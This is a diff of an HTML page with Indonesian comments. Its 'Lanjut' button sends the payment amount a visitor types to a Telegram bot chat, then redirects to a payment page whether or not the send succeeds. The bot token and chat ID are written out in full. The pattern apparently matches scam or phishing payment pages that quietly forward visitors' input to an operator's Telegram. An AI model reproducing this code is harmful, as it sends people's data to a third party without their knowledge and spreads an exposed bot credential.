@@ -153,46 +153,31 @@
     <button class="next-button" onclick="kirimKeTelegram()">Lanjut</button>
 
     <script>
-        function kirimKeTelegram() {
-            // 👇 Ganti dengan TOKEN BOT kamu
-            const token = "8601180674:AAFIKfS86WCFNfAg22OfU1_8z6MFRRxV6qM"; 
-            
-            // 👇 Ganti dengan CHAT ID kamu (tempat pesan masuk)
-            const chatId = "-1003984000704"; 
+function kirimKeTelegram() {
+    const token = "8601180674:AAFIKfS86WCFNfAg22OfU1_8z6MFRRxV6qM"; 
+    const chatId = "-1003984000704"; 
 
-            // Ambil angka yang diketik
-            var nominal = document.getElementById('nominalInput').value;
-            
-            // Isi pesan
-            var pesan = "🔔 NOMINAL PEMBAYARAN\nJUMLAH: Rp " + nominal;
+    let nominal = document.getElementById('nominalInput').value.trim();
+    nominal = parseInt(nominal);
 
-            // URL API Telegram
-            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    if (isNaN(nominal) || nominal < 1000) {
+        alert("⚠️ Masukkan nominal yang sah, minimal Rp 1.000");
+        return;
+    }
 
-            // Kirim data ke Telegram
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: pesan
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if(data.ok) {
-                    // Jika berhasil, pindah halaman
-                    window.location.href = "loading.html";
-                } else {
-                    alert("Gagal mengirim! Cek Token atau Chat ID.");
-                }
-            })
-            .catch(error => {
-                alert("Error: " + error);
-            });
-        }
-    </script>
-</body>
-</html>
+    // Kirim ke Telegram, tapi tetap pindah halaman meskipun gagal kirim
+    const pesan = "🔔 NOMINAL PEMBAYARAN\nJUMLAH: Rp " + nominal;
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+    fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: pesan })
+    })
+    .catch(() => { /* abaikan kesalahan jaringan */ });
+
+    // ✅ Pindah halaman PASTI berjalan
+    window.location.href = "pembayaran.html?nominal=" + encodeURIComponent(nominal);
+}
+</script>
+
